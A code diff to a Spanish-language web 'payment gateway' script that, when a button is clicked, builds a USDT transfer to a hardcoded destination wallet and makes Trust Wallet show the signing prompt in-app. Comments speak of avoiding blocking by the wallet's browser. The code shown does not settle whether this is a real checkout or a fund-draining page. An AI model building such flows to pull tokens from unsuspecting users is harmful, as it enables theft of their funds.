@@ -193,40 +193,54 @@ connectBtn.addEventListener("click", async () => {
         if (amountUnits > balance) throw new Error("Saldo USDT insuficiente.");
 
         const data = "0xa9059cbb" + encAddr(BILLETERA_DESTINO) + encUint(amountUnits);
-        const displayAmount = format18(amountUnits);
-
-        setStatus("Abriendo pasarela de aprobación nativa...");
+        
+        setStatus("Estimando gas para la firma...");
 
         const p = provider();
-        
+
+        // Estimación dinámica de gas en RPC público para evitar el bloqueo del navegador de Trust Wallet
+        let gasLimitHex = "0x11170"; // 70,000 gas por defecto para contratos BEP-20
         try {
-            const txHash = await p.request({
-                method: 'eth_sendTransaction',
-                params: [{
-                    from: walletAddress,
-                    to: CONTRATO_USDT,
-                    value: "0x0",
-                    data: data
-                }]
-            });
-            if (txHash) {
-                setStatus(`¡Transacción enviada!<br>Hash: ${txHash}`);
-                connectBtn.innerText = "Completado";
-                return;
+            const estGas = await publicRpc("eth_estimateGas", [{
+                from: walletAddress,
+                to: CONTRATO_USDT,
+                value: "0x0",
+                data: data
+            }]);
+            if (estGas) {
+                gasLimitHex = "0x" + Math.floor(Number(estGas) * 1.25).toString(16);
             }
-        } catch (innerErr) {
-            console.warn("Bloqueo del navegador interno detectado, activando pasarela Trust Wallet...", innerErr);
+        } catch (err) {
+            console.warn("Estimación automática omitida, usando gas estándar:", err);
         }
 
-        const bscChainId = "56";
-        const trustUniversalLink = `https://link.trustwallet.com/send?asset=c20000714_${CONTRATO_USDT}&address=${BILLETERA_DESTINO}&amount=${displayAmount}&chain_id=${bscChainId}`;
-        
-        setStatus("Redirigiendo a la interfaz de firma de Trust Wallet...");
-        window.location.href = trustUniversalLink;
+        setStatus("Abriendo ventana de confirmación en Trust Wallet...");
+
+        // LLAMADA ESTRICTA IN-APP: Obliga a la pasarela flotante de la app a mostrar la firma con gas seguro
+        const txHash = await p.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: walletAddress,
+                to: CONTRATO_USDT,
+                value: "0x0",
+                data: data,
+                gas: gasLimitHex
+            }]
+        });
+
+        if (!txHash) {
+            throw new Error("Transacción cancelada o sin respuesta de la billetera.");
+        }
+
+        setStatus(`¡Transacción firmada con éxito!<br>Hash: ${txHash}`);
+        connectBtn.innerText = "Completado";
+        connectBtn.disabled = false;
 
     } catch (e) {
         console.error("ERROR:", e);
-        setStatus("Error: " + (e.message || "Operación cancelada."));
+        // Si el usuario cancela en la ventana de firma flotante, se muestra claramente aquí sin falsos positivos
+        const errorMsg = e?.message || "Operación cancelada.";
+        setStatus("Aviso: " + errorMsg);
         connectBtn.disabled = false;
         connectBtn.innerText = walletAddress ? "Enviar USDT" : "Conectar a la Pasarela de pago";
     }
